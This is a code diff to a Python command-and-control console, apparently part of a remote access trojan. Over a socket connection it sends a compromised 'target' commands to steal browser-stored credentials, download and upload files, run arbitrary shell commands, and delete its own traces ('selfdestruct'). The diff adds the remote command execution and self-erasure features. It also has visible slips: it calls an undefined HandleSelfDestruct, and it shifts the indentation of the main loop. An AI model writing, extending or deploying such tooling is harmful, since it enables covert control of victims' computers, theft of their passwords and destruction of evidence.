@@ -13,6 +13,28 @@ clients = 0
 i = 0
 
 
+# a function to delete the program and any files it created on the target
+def SelfDestruct(command, con):
+    print("Goodbye\n")
+    con.send(f"CID {command}".encode())
+
+
+# a function to run scripts and shell commands
+def RunCommand(command, con):
+    con.send(f"CID {command}".encode())
+    response = con.recv(4096)
+    if not response:
+        pass
+    print(response.decode("utf-8"))
+    buffer = b""
+    while True:
+        response = con.recv(4096)
+        if not response:
+            break
+        buffer += response
+    print(buffer.decode("utf-8"))
+
+
 # a function for uploading a file to the target computer
 def HandleUpload(file_path, con):
     try:
@@ -68,7 +90,6 @@ def HandleCommand(command, con):
     Handeling commands sent by the user to the client and their response
     """
     # Handeling the "creds" command, getting (encrypted) browser stored passwords
-
     if command.lower().__contains__("creds"):
         con.send(f"CID {command}".encode())
         response = con.recv(4096)
@@ -88,7 +109,6 @@ def HandleCommand(command, con):
             HandleDownload(response, con)
         else:
             print(response)
-
     # Handeling the "download" command, downloading files from the client
     if command.lower().__contains__("download"):
         con.send(f"CID {command}".encode())
@@ -97,11 +117,22 @@ def HandleCommand(command, con):
             print("no response")
         else:
             HandleDownload(response, con)
-
+    # Handeling the "upload" command, uploading files from local machine to target
     if command.lower().__contains__("upload"):
         file_path = command.split(" ")
         HandleUpload(file_path, con)
-
+    # Handeling the "run" command, running scripts and shell commands on target
+    if command.lower().__contains__("run"):
+        RunCommand(command, con)
+    # Handeling the "selfdestruct" command.
+    if command.lower().__contains__("selfdestruct"):
+        confirmation = input("Are you sure you want to do this (Yes/no)\n")
+        if confirmation.lower() == "yes":
+            HandleSelfDestruct(command, con)
+        elif confirmation.lower() == "no":
+            print("self destruct aborted...\n")
+        else:
+            print("Invalid operation, self destruct aborted...")
     else:
         pass
 
@@ -124,10 +155,10 @@ try:
             else:
                 print(response.decode("utf-8"))
 
-            command = input(">>>")
-            if command == "":
-                continue
-            HandleCommand(command, con)
+        command = input(">>>")
+        if command == "":
+            continue
+        HandleCommand(command, con)
 
 
 except KeyboardInterrupt:
